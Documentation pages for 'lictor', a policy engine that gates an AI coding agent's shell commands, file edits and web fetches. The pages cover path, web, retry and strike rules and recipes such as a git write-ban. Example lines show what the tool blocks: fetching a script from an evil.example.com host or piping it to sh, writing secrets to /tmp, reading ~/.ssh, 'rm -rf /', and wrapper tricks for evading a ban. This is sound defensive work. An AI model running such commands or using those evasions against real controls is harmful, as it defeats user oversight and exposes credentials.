+Names are matched **verbatim** against the `permission_mode` the harness sends — lictor hardcodes no list, so an unknown mode simply matches nothing. If the harness ever renames a mode, `settings.mode_aliases` maps the new name back to the one your config uses (single hop, no lictor update needed):
+
+```toml
+[settings]
+mode_aliases = { unattended = "auto" }   # harness name = the name in this file
+```
+
+Every `[modes.auto]` overlay, `modes = { auto = ... }` map, and `[modes.auto.remap]` keeps firing when the harness sends `unattended`.
+
+Dry-run a mode: `lictor check --mode auto -- 'curl https://x'`.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Modules
+
+Context-aware checks backed by read-only probes (`git ls-files`, a PATH resolve, session state) — they look at real state before deciding, which plain pattern rules can't. Toggle each by name; values are a subset of `off | warn | rewrite | ask | deny | allow` per module. Rewrites run **before** gating, so the result is judged in its final form.
+
+## Config
+
+```toml
+[modules]
+git-mv = "rewrite"          # mv of a git-tracked path → git mv (keeps history)
+git-rm = "rewrite"          # rm of a git-tracked path → git rm (records the deletion)
+delete-recreate = "ask"     # a Write resembling a just-deleted file → rename it properly
+self-rm = "allow"           # rm of files the agent itself created this session → no prompt
+pm-cwd = "rewrite"          # cd pkg && bun run x → bun --cwd pkg run x
+abs-paths = "deny"          # absolute path to an in-project file → use the relative one
+path-check = "warn"         # program guaranteed not to resolve on PATH → tell the agent why
+```
+
+## What happens
+
+```
+mv src/a.ts src/b.ts              → runs `git mv src/a.ts src/b.ts` (file is tracked)
+mv untracked.log old.log          → untouched (not tracked — nothing to preserve)
+rm -f tracked.rs                  → runs `git rm -f tracked.rs`
+cd pkgs/api && bun run lint       → runs `bun --cwd pkgs/api run lint` (cwd stays put)
+rm scratch.rs                     → no prompt (agent created it this session — self-rm)
+rm scratch.rs some-old-file.rs    → prompt (chain touches a pre-existing file)
+cat /Users/me/proj/src/x.ts       → blocked: reference it as `src/x.ts` (abs-paths)
+tokf run -- cargo check           → runs; hint: `tokf` is not on PATH (path-check)
+
+after `rm old.rs`, a Write of ~95% identical content
+→ prompt: "restore + `git mv` instead of delete/recreate" (delete-recreate)
+
+git status && echo === && cargo check
+→ hint: zsh expands `===` as a command lookup (`== not found` aborts the line) — quote it or drop it (path-check)
+```
+
+Fine print: `abs-paths` reads **literal** paths only — dynamic `$HOME/…` args are left alone, and paths *outside* the project are the [jail](jail.md)'s job. `path-check` resolves against the hook's own PATH and skips shell builtins, functions defined in the command, and program words containing `/`; aliases and functions from your rc files are invisible to it — the `warn` default tolerates that, escalate to `ask`/`deny` to stop the command instead. When the missing tool matches an [activate](activate.md) rule whose marker file is present, the hint includes the activation command.
+
+Jail, path rules, strikes, and activate are modules too, configured via `[settings]` / their own tables — see [jail](jail.md), [path rules](path-rules.md), [strikes](strikes.md), [activate](activate.md).
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Path rules
+
+Your own directory policy: `[[path]]` globs are matched against **every filesystem path a command touches** — args, `NAME=val`/`export` values, write-redirect targets, and Write/Edit file paths. Use them for temp/scratch/secrets opinions; lictor ships no default here, you bring the dirs and the message.
+
+First matching rule wins, so a specific `allow` carves an exception out of a broad `deny`. Each glob is tested against both the lexical and symlink-resolved path — one `/tmp/**` covers macOS's `/private/tmp` too.
+
+## Config
+
+```toml
+[[path]]
+match  = ["/private/tmp/claude-501/**"]   # sanctioned scratchpad — first match wins
+action = "allow"
+
+[[path]]
+match  = ["/tmp/**", "/private/tmp/**"]
+action = "deny"
+hint   = "scratch goes in .claude/scratch/ or `kv set`, never /tmp"
+
+[[path]]
+match  = ["~/.ssh/**", "~/.aws/**"]
+action = "ask"
+hint   = "touching credentials — confirm intent"
+```
+
+## What happens
+
+```
+touch /tmp/notes.txt                  → blocked: "scratch goes in .claude/scratch/…"
+echo secret > /tmp/leak               → blocked (redirect target)
+OUT=/tmp/build cargo build            → blocked (assignment value)
+bash -c 'echo x > /tmp/nested'        → blocked (redirect inside a nested shell)
+Write /private/tmp/analysis.md        → blocked (file-edit path, same rule)
+echo hi > /private/tmp/claude-501/x   → runs (the allow above matched first)
+cat ~/.ssh/config                     → prompt: "touching credentials — confirm intent"
+```
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Features
+
+One short doc per feature: what it does, config example, what happens when the agent runs something.
+
+## Actions
+
+When several rules match the same command, **most-restrictive wins, order-independent**:
+
+```
+deny  >  skip  >  ask  >  warn  >  rewrite  >  allow
+```
+
+| Doc | One-liner |
+|---|---|
+| [allow](allow.md) | auto-approve a command, skip the permission prompt |
+| [deny](deny.md) | block a command, hand the agent your reason |
+| [ask](ask.md) | force the permission prompt |
+| [warn](warn.md) | let it run, attach a hint to the agent's context |
+| [rewrite](rewrite.md) | replace the command with a better one, re-gate the result |
+| [log](log.md) | audit-only: record the match, decide nothing |
+| [skip](skip.md) | true no-op — carve an exception out of a catalog, harness rules decide |
+
+## Rule types
+
+| Doc | One-liner |
+|---|---|
+| [catalogs](catalogs.md) | named command groups — gate ~150 commands with one line |
+| [edit rules](edit-rules.md) | gate file edits by path + what's added / removed / missing |
+| [path rules](path-rules.md) | your own dir policy, matched against every path a command touches |
+| [web rules](web.md) | domain/URL policy for curl/wget/WebFetch — allow, deny, or proxy-rewrite |
+| [agent rules](agent.md) | regex over subagent prompts (gate) and outputs (hint) |
+| [retries](retries.md) | deny once then allow the resubmit; quiet a repeated hint |
+
+## Guards
+
+| Doc | One-liner |
+|---|---|
+| [jail](jail.md) | paths outside the project → warn/ask/deny |
+| [strikes](strikes.md) | N consecutive denies → autonomy paused until a command runs |
+| [detectors](detectors.md) | obfuscation, injected env vars, inline scripts, shell-written files |
+| [fail-closed](fail-closed.md) | what can't be statically proven escalates to a prompt |
+| [modes](modes.md) | different policy per permission mode (auto, bypassPermissions, …) |
+
+## Output & context
+
+| Doc | One-liner |
+|---|---|
+| [minify](minify.md) | wrap/pipe/truncate noisy command output |
+| [spill](spill.md) | oversized output → kv cache, model gets the tail + retrieval note |
+
+## Helpers
+
+| Doc | One-liner |
+|---|---|
+| [modules](modules.md) | context-aware rewrites: `mv`→`git mv`, `cd pkg && bun run`→`bun --cwd`, … |
+| [activate](activate.md) | "command not found" + toolchain marker → tell the agent how to fix it |
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Retries
+
+`retry_count` + `retry_window` (seconds) on a `[[bash]]`/`[[edit]]` rule — both required. Two uses: a deny that's a speed bump instead of a wall, and a warn that stops nagging once the agent has seen it. Counters are per rule per session and expire on their own.
+
+## Config
+
+```toml
+# deny-then-allow: first attempt bounces with the hint, the resubmit goes through
+[[bash]]
+match = "git checkout -- *"
+action = "deny"
+reason = "This discards local changes. Resubmit if that is really what you want."
+retry_count = 1
+retry_window = 30
+
+# hint quieting: deliver the warn twice, then shut up
+[[edit]]
+paths = ["**/*.ts"]
+removed_pattern = '(?s)/\*\*.*?\*/'
+action = "warn"
+hint = "A doc-comment was removed by this edit."
+retry_count = 2
+retry_window = 300
+```
+
+## What happens
+
+```
+git checkout -- src/x.ts       → deny: "This discards local changes. Resubmit if…"
+git checkout -- src/x.ts       → runs (identical resubmit within 30s of the deny)
+                                  …next session, or after 30s idle: denies again
+
+Edit removing a doc-comment    → hint delivered (1)
+Edit removing a doc-comment    → hint delivered (2)
+Edit removing a doc-comment    → silent (quieted; counter resets, will fire again later)
+```
+
+`lictor check` never touches the counters — every debug run looks like a first attempt.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# rewrite
+
+Replaces the matched command words with yours, keeps the arguments, runs the result. Use it when the agent's command is *fixable* — blocking wastes a turn, rewriting doesn't. The rewritten command is re-gated, so a rewrite can't smuggle past a ban.
+
+## Config
+
+```toml
+[[bash]]
+match = "grep*"
+action = "rewrite"
+rewrite = "rg"
+hint = "grep is banned here; the command was rewritten to ripgrep."
+```
+
+## What happens
+
+```
+grep TODO src/                → runs `rg TODO src/`; agent is told about the rewrite
+grep -r TODO | head           → rewrite applies inside the pipeline too
+```
+
+Careful: the args are kept as-is. `grep -r` becomes `rg -r` — and `-r` means `--replace` in ripgrep. If flags don't translate, prefer a `deny` with a teaching reason (see the [search-discipline recipe](../use-cases/search-discipline.md)).
+
+Context-aware rewrites (`mv`→`git mv`, `cd pkg && bun run x`→`bun --cwd pkg run x`, bin-path stripping) are [modules](modules.md), not pattern rules — they check real state before rewriting.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# skip
+
+True no-op: no decision, no hint, no log entry. `skip` overrides any `ask`/`warn`/`log`/`allow` another rule gives the **same** match — so a narrow rule can carve an exception out of a broad catalog without overriding the whole thing. An explicit `deny` elsewhere still wins. With lictor silent, Claude Code's own permission rules decide.
+
+## Config
+
+```toml
+[settings]
+catalogs = ["recommended"]       # mutating catalog: rm → ask
+
+[[bash]]
+match = "rm .claude/scratch/*"   # our own scratch dir specifically
+action = "skip"
+```
+
+## What happens
+
+```
+rm src/main.rs                → prompt (mutating catalog's ask, untouched)
+rm .claude/scratch/tmp.json   → lictor steps aside; Claude Code's own rules decide
+rm -rf /                      → blocked (destructive catalog's deny beats skip)
+```
+
+Why not `allow`? An `allow` auto-approves — a stronger statement than you may want. `skip` just removes lictor's opinion and hands the call back to the harness.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Spill
+
+Oversized or slow command output goes to a local [kv](https://github.com/AmrSaber/kv) cache instead of the context window; the model gets the tail plus the exact `kv get` command to query the rest. Use it so one `cargo test` doesn't eat 3 000 lines of context — and so the agent re-queries the cache instead of re-running the suite.
+
+`kv` is a separate CLI: `brew install AmrSaber/tap/kv` (source: [github.com/AmrSaber/kv](https://github.com/AmrSaber/kv)). The built-in `kv-cache` [catalog](catalogs.md) allows all its subcommands so the retrieval loop never prompts.
+
+## Config
+
+```toml
+[settings]
+spill_lines = 200        # outputs over 200 lines spill
+spill_seconds = 30       # …or anything from a command that ran ≥ 30s (worth caching)
+spill_keep = 20          # tail lines the model still sees
+spill_expires = "24h"    # forwarded to `kv set --expires-after`
+# spill_command = "kv"   # override the storage CLI
+
+[[bash]]
+match = "kv *"           # the retrieval loop depends on kv — never prompt for it
+action = "allow"
+```
+
+## What happens
+
+```
+cargo test   (3 400 lines)
+→ full output stored: `kv set lictor-cargo-test-1751833542`
+→ model sees:
+  [lictor] output too large: 3412 lines / 214806 bytes. Full output stored: retrieve with
+  `kv get lictor-cargo-test-1751833542` and pipe through rg/tail — do not dump it whole. Last 20 lines:
+  …
+
+agent follows up:
+kv get lictor-cargo-test-1751833542 | rg "^test result"   → instant, no re-run
+```
+
+Degrades gracefully at run time: `kv` not installed → the tail still replaces the output, marked as unstored. But `lictor check` treats it as an **error** when spill is configured and the CLI is missing — every retrieval note the model would see points at a store that doesn't exist. Runs after [minify](minify.md), applies to all commands.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Strikes
+
+Rogue-actor brake: N consecutive lictor denies with no command executed in between pauses shell autonomy — every Bash call asks until one actually runs. Use it as the backstop for an agent that's stuck fighting the policy or being steered somewhere it shouldn't go; it puts you back in the loop automatically.
+
+## Config
+
+```toml
+[settings]
+strikes = 5
+```
+
+## What happens
+
+```
+deny #1 … deny #5 (nothing executed in between)
+→ lictor: 3+ consecutive denied commands — shell autonomy paused; a user-approved command lifts it
+git status                    → prompt (yes, even though it's allowed)
+  …you approve, it executes   → counter resets, autonomy restored
+```
+
+Any successfully executed command resets the counter — normal work never trips it; only a deny streak does.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# warn
+
+No decision — the command runs as it would anyway, but your `hint` is attached to the agent's context. Use it to steer habits without blocking: strong enough that the agent adjusts, soft enough that nothing breaks when it doesn't.
+
+## Config
+
+```toml
+[[bash]]
+match = "curl*"
+action = "warn"
+hint = "Prefer the internal fetch proxy for web pages."
+
+[[edit]]
+paths = ["**/*.ts", "**/*.tsx"]
+removed_pattern = '(?s)/\*\*.*?\*/'
+action = "warn"
+hint = "A doc-comment was removed by this edit — keep it unless the user asked."
+```
+
+## What happens
+
+```
+curl https://example.com      → runs; agent's context gets: "Prefer the internal fetch proxy…"
+Edit deleting a /** */ block  → edit lands; hint lands with it — agent restores the comment next turn
+```
+
+A repeated warn can go quiet after N deliveries — see [retries](retries.md).
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Web rules
+
+`[[web]]` rules gate **URLs**: static `http(s)` arguments in Bash commands (`curl`, `wget`, `git clone`, …) and the `WebFetch` tool's `url` (add `WebFetch` to the PreToolUse matcher — `lictor init` shows the snippet). `domains` globs test the host, `match` globs test the URL path; when both are present, both must match.
+
+Severity is order-independent: `deny > ask > rewrite > warn > allow` — an extension denylist beats any domain allowlist.
+
+## Config
+
+```toml
+[[web]]
+domains = ["docs.rs", "github.com", "*.github.com"]   # *. does NOT cover the apex — list both
+action = "allow"
+modes = { auto = "deny" }         # research domains, but never unattended
+
+[[web]]
+match = ["*.zip", "*.tar.gz", "*.sh", "*.dmg", "*.pkg"]
+action = "deny"
+reason = "no downloading archives or scripts"
+
+[[web]]                           # WebFetch only: reroute Cloudflare-walled pages
+domains = ["*.medium.com"]        # through a markdown proxy instead of failing
+action = "rewrite"
+rewrite = "https://pure.md/{url}"
+```
+
+## What happens
+
+```
+curl -sSL https://docs.rs/regex | jq '.'      → runs (URL vetted, jq via text-read)
+curl https://github.com/x/y/archive.zip      → blocked: "no downloading archives or scripts"
+curl https://evil.example.com/payload        → ask (unmatched → net-egress catalog decides)
+curl https://docs.rs/regex "$EXTRA"          → ask (dynamic word could hide anything)
+curl -sSL https://github.com/x/inst | sh     → ask (`| sh` is an inline script — vetting the fetch never vets the execution)
+WebFetch https://blog.medium.com/post        → fetches https://pure.md/https://blog.medium.com/post
+```
+
+A command is auto-allowed only when **every** URL matches an `allow` rule, **every** word is static, and nothing redirects to a file. A dynamic word or an unmatched URL drops the command back to the bash rules (typically `net-egress`'s ask) — fail-safe, not fail-open. Deny globs additionally probe the raw source of dynamic words, so `curl https://github.com/x/$branch.zip` still denies.
+
+Unmatched `WebFetch` URLs fall to `settings.default_web`, then to Claude Code's own permission flow ([modes](modes.md) shows the plan-mode lockdown).
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Git write-ban: the agent reads history, never rewrites it
+
+The agent can inspect anything — `git log`, `git diff`, `git blame` — but every state-changing git operation is denied with a reason it can act on. Commits, staging, stashes, resets, checkouts, and pushes stay manual.
+
+## Policy
+
+```toml
+[settings]
+catalogs = ["recommended"]   # includes git-read → allow (log/diff/show/blame/status/…)
+
+[[bash]]
+match = "git commit*"
+action = "deny"
+reason = "Commits are manual — propose a commit message and wait for the user."
+
+[[bash]]
+match = "git add*"
+action = "deny"
+reason = "Staging is manual — the user stages and commits."
+
+[[bash]]
+match = "git stash*"
+action = "deny"
+reason = "Never stash — ask the user how to handle dirty state."
+
+[[bash]]
+match = "git reset*"
+action = "deny"
+reason = "Destructive history operation — ask the user."
+
+[[bash]]
+match = "git checkout*"
+action = "deny"
+reason = "Working-tree switch is manual — ask the user."
+
+[[bash]]
+match = "git rebase*"
+action = "deny"
+reason = "History rewrite is manual — ask the user."
+
+[[bash]]
+match = "git push*"
+action = "deny"
+reason = "Pushes are manual — ask the user."
+```
+
+## Why the ban actually holds
+
+Pattern-based permission systems check the top-level command; lictor gates **every command in the chain** after unwrapping, so the usual leaks are closed:
+
+```
+echo ok && git commit -m wip          → deny (ban found inside the chain)
+bash -c "git commit -m wip"           → deny (payload parsed)
+eval 'git add -A'                     → deny
+/usr/bin/git commit                   → deny (path-qualified git == git)
+git -C /elsewhere commit              → deny (global flags unwrapped)
+git $ACTION                           → ask  (dynamic word — fail closed, not allowed)
+```
+
+The `reason` is handed back verbatim, so instead of retrying variants the agent proposes a commit message and stops — which is the behavior you wanted.
+
+## Variations
+
+**Softer:** `action = "ask"` on `git push*` if you want a prompt rather than a ban for pushes specifically.
+
+**Deny once, then allow the retry** — for rules that are a speed bump, not a wall. The first attempt is denied with the hint; an identical resubmission inside the window goes through:
+
+```toml
+[[bash]]
+match = "git checkout -- *"
+action = "deny"
+reason = "This discards local changes. Resubmit if that is really what you want."
+retry_count = 1
+retry_window = 30
+```
+
+**Branch-scoped force-push ban** while allowing plain pushes:
+
+```toml
+[[bash]]
+match = "git push*"
+action = "ask"
+
+[[bash]]
+match = "git push"
+contains = ["--force", "-f", "--force-with-lease"]
+action = "deny"
+reason = "Force pushes are banned."
+```
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Require frontmatter metadata in Markdown files
+
+Every Markdown file the agent writes must carry `created_at:` / `updated_at:` frontmatter, and every later edit must bump `updated_at:`. Agents skip metadata unless forced; `required_pattern` forces it.
+
+## Policy
+
+```toml
+[[edit]]
+paths = ["docs/**/*.md", "notes/**/*.md"]
+required_pattern = '(?m)^created_at: \d{4}-\d{2}-\d{2}'
+action = "deny"
+hint = "Markdown docs carry frontmatter — start the file with `---`, `created_at: YYYY-MM-DD`, `updated_at: YYYY-MM-DD`, `---`."
+
+[[edit]]
+paths = ["docs/**/*.md", "notes/**/*.md"]
+required_pattern = '(?m)^updated_at: \d{4}-\d{2}-\d{2}'
+action = "deny"
+hint = "Bump `updated_at:` in the frontmatter as part of this edit."
+```
+
+## How it plays out
+
+`required_pattern` fires when the **written content is missing** the regex — the inverse of `pattern`, which fires when content matches.
+
+- **Write** sends the full file, so the check is against the whole document: a new `docs/plan.md` without frontmatter is denied, the hint lands in the agent's context, and the retry arrives with the `---` block on top.
+- **Edit / MultiEdit** are checked against the edit's `new_string`s — the rule is satisfied when **any** edit pair contains the pattern. A body-only edit is denied, so the agent learns to attach one extra edit pair that rewrites the `updated_at:` line. That's the enforcement: you can't touch the file without touching the timestamp.
+
+```
+Write docs/plan.md ("# Plan\n...")          → deny: start the file with `---`, created_at…
+Write docs/plan.md ("---\ncreated_at: …")   → passes
+Edit  docs/plan.md (body change only)       → deny: bump `updated_at:` as part of this edit
+MultiEdit (body change + updated_at bump)   → passes
+```
+
+## Variations
+
+Prefer a nudge over a hard block — `warn` attaches the hint without denying, and `retry_count`/`retry_window` stop it from nagging forever:
+
+```toml
+[[edit]]
+paths = ["docs/**/*.md"]
+required_pattern = '(?m)^updated_at: \d{4}-\d{2}-\d{2}'
+action = "warn"
+hint = "Consider bumping `updated_at:` in the frontmatter."
+retry_count = 2      # after 2 hints in the window, stop repeating it
+retry_window = 300
+```
+
+Scope the paths deliberately: `**/*.md` would also catch `README.md` and generated changelogs. List the directories where the convention actually applies.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Protect doc-comments and tests from "cleanup"
+
+Agents delete things that get in their way: a doc-comment on a function they refactor, a failing test that "no longer applies". `removed_pattern` fires when content that matched in the old text is **gone from the new text** — the inverse direction of `pattern`, which checks what's being added.
+
+## Policy
+
+```toml
+# tsdoc / jsdoc blocks must survive refactors
+[[edit]]
+paths = ["**/*.ts", "**/*.tsx"]
+removed_pattern = '(?s)/\*\*.*?\*/'
+action = "warn"
+hint = "A doc-comment was removed by this edit — keep it unless the user asked for its removal."
+
+# rust doc-comments
+[[edit]]
+paths = ["**/*.rs"]
+removed_pattern = "(?m)^///"
+action = "warn"
+hint = "Rust doc-comments (///) must not be removed."
+
+# deleting a test is a decision the user makes, not the agent
+[[edit]]
+paths = ["**/*.test.ts", "**/*.spec.ts", "**/*.test.tsx"]
+removed_pattern = '(?m)^\s*(it|test|describe)\('
+action = "deny"
+hint = "Never delete test cases — refactor them to the new API. If a test genuinely cannot survive, list it and ask the user."
+
+[[edit]]
+paths = ["**/*.rs"]
+removed_pattern = '(?m)^\s*#\[test\]'
+action = "deny"
+hint = "Never delete tests — port them to the new shape, or ask the user per case."
+```
+
+## How it plays out
+
+`removed_pattern` compares each edit pair: it fires when the regex matches `old_string` but not `new_string`. `Write` calls send no prior content, so they never trigger it — this is a guard on **edits**, where deletion is visible.
+
+```
+Edit: "/** Returns the user. */\nfunction getUser…" → "function getUser…"
+  → warn: a doc-comment was removed by this edit…
+
+Edit: reworded comment, /** */ block still present   → silent
+Edit: "it('rejects empty input', …)" block deleted   → deny: never delete test cases…
+```
+
+A `warn` doesn't block — the edit lands and the hint lands with it, so the agent restores the comment in its next edit or explains why it had to go. A `deny` blocks outright; the assertion never leaves the file.
+
+## Variations
+
+Combine directions in one rule — both conditions must hold. This catches "replaced the real docs with a TODO placeholder":
+
+```toml
+[[edit]]
+paths = ["**/*.ts"]
+pattern = "TODO"
+removed_pattern = '(?s)/\*\*.*?\*/'
+action = "warn"
+hint = "Doc-comment replaced by a TODO placeholder — restore the docs."
+```
+
+Let a repeated warn go quiet once it's been delivered — the agent saw the hint, no need to repeat it every edit:
+
+```toml
+[[edit]]
+paths = ["**/*.ts", "**/*.tsx"]
+removed_pattern = '(?s)/\*\*.*?\*/'
+action = "warn"
+hint = "A doc-comment was removed by this edit."
+retry_count = 2
+retry_window = 300
+```
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Auto-approve everything read-only
+
+Most permission prompts are for commands that can't hurt you: `ls`, `git diff`, `docker ps`, `kubectl get`. One line auto-approves ~150 of them; anything that mutates, installs, or hits the network still asks.
+
+## Policy
+
+```toml
+[settings]
+catalogs = ["read-only"]     # the 16 *-read/query catalogs → allow, nothing else
+```
+
+Or take the batteries-included variant — same read-only allows, plus `net-egress`/`mutating`/`pkg-install` → ask and `secrets-read`/`destructive`/`gtfobins`/`obfuscation` → deny:
+
+```toml
+[settings]
+catalogs = ["recommended"]
+```
+
+The full command list per catalog lives in [`src/catalogs/builtin.toml`](../../src/catalogs/builtin.toml); how catalogs work is in [features/catalogs](../features/catalogs.md).
+
+## What "read-only" survives
+
+Auto-approval is conservative — the allow only holds when lictor can prove it:
+
+- **Every command in a chain must be vetted.** `git status && rm -rf x` is not covered by the `git status` allow.
+- **An output redirect disqualifies the command.** `git diff > patch.txt` writes a file, so it's no longer read-only and falls back to the normal prompt. `/dev/null` and `2>&1` stay harmless.
+- **Wrappers count separately.** `sudo git status` is not `git status`.
+- **Overlaps resolve toward the dangerous case.** `cat` is allowed (`text-read`) but `cat .env` is denied (`secrets-read`) — most-restrictive wins, no ordering rules.
+
+## Extending it
+
+Your own read-only tools get plain allow rules, or a custom catalog when there are several:
+
+```toml
+[[bash]]
+match = "lictor check*"
+action = "allow"
+
+[catalog.my-readers]
+match = ["moon query*", "moon project*", "proto plugin search *"]
+action = "allow"
+```
+
+Read-heavy CLIs with noisy output get a `[[minify]]` wrap; `allow = true` auto-approves the wrapped form in the same block:
+
+```toml
+[[minify]]
+match = "git log*"
+wrap = "rtk"       # git log → rtk git log
+allow = true
+```
+
+Trim a built-in instead of abandoning it:
+
+```toml
+[catalog.git-read]
+add    = ["git worktree list"]
+remove = ["git grep"]
+```
+
+## Unattended modes
+
+The starter policy remaps every `ask` to `deny` in `auto` mode (nobody's there to answer), so a read-only allowlist is what keeps an unattended agent moving. Pair it with a jail so "read-only" also means "inside the repo":
+
+```toml
+[modes.auto.remap]
+ask = "deny"
+
+[modes.auto.settings]
+jail = "deny"
+```
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Search discipline: ripgrep only
+
+`grep -r`, `find -name`, `ack`, `ag` — slower, ignore `.gitignore`, and each needs its own flags. One tool covers content search and file discovery. Deny the legacy tools with a hint that teaches the replacement.
+
+## Policy
+
+```toml
+# deny rather than rewrite: a naive `rewrite = "rg"` keeps grep's flags, and
+# `grep -r` would become `rg -r` (--replace) — a different command. The deny
+# hint makes the agent redo it correctly in one turn.
+[[bash]]
+match = "grep"
+action = "deny"
+reason = "Use rg (ripgrep): recursive by default, `rg <pattern> [path]`. Flags differ from grep."
+
+[[bash]]
+match = "find*"
+action = "deny"
+reason = "Use rg: `rg --files --glob \"*.ext\"` for files, `rg <pattern>` for content."
+
+[[bash]]
+match = "ack*"
+action = "deny"
+reason = "Use rg instead."
+
+[[bash]]
+match = "ag*"
+action = "deny"
+reason = "Use rg instead."
+```
+
+## How it plays out
+
+The ban holds inside pipes and chains — `cat log.txt | grep ERROR` is denied just like a bare `grep`, and the reason lands in the agent's context:
+
+```
+grep -r TODO src/          → deny: use rg (ripgrep)…   → agent runs `rg TODO src/`
+find . -name "*.rs"        → deny: use rg --files…     → agent runs `rg --files --glob "*.rs"`
+cargo test | grep FAILED   → deny (grep found inside the pipeline)
+```
+
+## Variations
+
+**Nudge instead of ban** — the built-in `search-nudge` catalog attaches a "prefer rg" hint to `grep`/`find`/`sed` without blocking or granting anything (it ships in the `read-only` and `recommended` bundles).
+
+**Auto-rewrite** works when your usage is flag-free:
+
+```toml
+[[bash]]
+match = "grep*"
+action = "rewrite"
+rewrite = "rg"       # grep TODO src/ → rg TODO src/, then re-gated
+```
+
+**Watch for name collisions**: `match = "grep"` (exact word) rather than `grep*`, so a tool like `grepai` isn't swallowed by the ban. Glob patterns match word-wise against the command.
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# Temp hygiene: no /tmp, cache output in kv, scratch in the repo
+
+Agents love `/tmp`: dump a log there, write a helper script there, `tee` intermediate output there. Files in system temp are invisible to you and survive nothing. `[[path]]` rules ban the directories with your own message, and the spill guard makes the kv cache the natural place for command output.
+
+## Policy
+
+```toml
+[settings]
+# oversized/slow output is cached via `kv set` automatically; the model sees
+# the tail plus the exact `kv get <key>` command to re-query it
+spill_lines = 200
+spill_keep = 20
+spill_seconds = 30
+spill_expires = "24h"
+
+# every macOS system-temp location. /tmp resolves to /private/tmp and $TMPDIR
+# lives under /var/folders, so both spellings are listed — each glob is tested
+# against the lexical AND the symlink-resolved path.
+[[path]]
+match = [
+  "/tmp/**", "/private/tmp/**",
+  "/var/tmp/**", "/private/var/tmp/**",
+  "/var/folders/**", "/private/var/folders/**",
+]
+action = "deny"
+hint = "No system temp — cache command output with `kv set <key>`, or write scratch files to .claude/scratch/."
+
+# the spill retrieval loop depends on kv — never prompt for it
+[[bash]]
+match = "kv *"
+action = "allow"
+```
+
+## How it plays out
+
+`[[path]]` rules match **every filesystem path a command touches**: arguments (cd-aware), `NAME=val` / `export` assignment values, write-redirect targets, and Write/Edit file paths. There is no redirect loophole:
+
+```
+touch /tmp/notes.txt                        → deny: no system temp…
+echo secret > /tmp/leak                     → deny (redirect target)
+OUT=/var/tmp/build cargo build              → deny (assignment value)
+bash -c 'echo x > /tmp/nested'              → deny (redirect inside a nested shell)
+Write /private/tmp/analysis.md              → deny (file-edit path, same rule)
+cargo test   (3400 lines)                   → runs; output spilled to kv, model
+                                              sees the tail + `kv get lictor-cargo-test-…`
+```
+
+The deny `hint` teaches the workflow: expensive output goes through `kv set` / `kv get` instead of `> /tmp/out.txt`, and deliberate scratch files go in a visible, project-scoped directory.
+
+## Variations
+
+First matching rule wins, so a specific `allow` carves an exception out of the broad deny — e.g. permit one sanctioned scratchpad:
+
+```toml
+[[path]]
+match = ["/private/tmp/claude-501/**"]   # this harness's session scratchpad
+action = "allow"
+
+[[path]]
+match = ["/tmp/**", "/private/tmp/**"]
+action = "deny"
+hint = "No system temp — use the session scratchpad or `kv set`."
+```
+
+Prefer `ask` over `deny` if some temp usage is legitimate but you want to see it. And if you'd rather ban shell-redirect file authoring everywhere (not just in temp): `on_shell_write = "deny"` routes `echo x > f` / `cat > f <<EOF` to "use the Write tool".
+---
+created_at: 2026-07-14
+updated_at: 2026-07-14
+---
+
+# TypeScript: lint, typecheck, and no suppressions
+
+Three habits agents fall into on TS codebases: silencing the linter instead of fixing the finding, casting around type errors, and running `npx tsc` instead of the project's own scripts. All three are one edit/bash rule each.
+
+## Policy
+
+```toml
+# suppressing a finding is not fixing it
+[[edit]]
+paths = ["**/*.ts", "**/*.tsx"]
+pattern = "eslint-disable|@ts-ignore|@ts-expect-error|@ts-nocheck"
+action = "deny"
+hint = "Fix the lint/type error instead of suppressing it. If the suppression is genuinely warranted, ask the user."
+
+# type assertions mask real mismatches
+[[edit]]
+paths = ["**/*.ts", "**/*.tsx"]
+pattern = "as (any|never|unknown)"
+action = "deny"
+hint = "No type assertions — fix the type design instead."
+
+# deps go through the package manager, not hand-edited into package.json
+[[edit]]
+paths = ["**/package.json"]
+pattern = '"[^"]+"\s*:\s*"(\^|~|>=?|<=?|\d|\*|npm:|latest)'
+action = "deny"
+hint = "Don't hand-edit deps — use `bun add <pkg>` / `bun remove <pkg>`."
+
+# the project defines its own scripts — don't bypass their flags/config
+[[bash]]
+match = "npx tsc*"
+action = "deny"
+reason = "Use the project script: bun run typecheck."
+
+[[bash]]
+match = "bunx tsc*"
+action = "deny"
+reason = "Use the project script: bun run typecheck."
+
+# the dev loop itself is auto-approved and its output truncated
+[[bash]]
+match = "bun run*"
+action = "allow"
+
+[[minify]]
+match = "eslint*"
+wrap = "tokf run --"    # or `max_lines = 80` for the built-in truncator
+allow = true            # auto-approve the wrapped command too
+
+[[minify]]
+match = "tsc*"
+wrap = "tokf run --"
+allow = true
+
+[[minify]]
+match = "vitest*"
+max_lines = 80
+preserve = ["(?i)error", "(?i)fail"]
+```
+
+## How it plays out
+
+```
+Edit src/api.ts  (adds `// eslint-disable-next-line`)   → deny: fix the lint error instead…
+Edit src/api.ts  (adds `res as any`)                    → deny: no type assertions…
+Edit package.json (adds `"zod": "^3.23.0"`)             → deny: use `bun add zod`
+npx tsc --noEmit                                        → deny: use bun run typecheck
+bun run lint                                            → auto-approved
+eslint src/                                             → rewritten to `tokf run -- eslint src/`, auto-approved, output shrunk
+```
+
+The `pattern` regex runs over the **written content** of every `Edit`/`Write`/`MultiEdit`/`NotebookEdit` call — a suppression comment never reaches the file, and the deny `hint` tells the agent what to do instead, so it corrects in one turn instead of retrying blind.
+
+## Variations
+
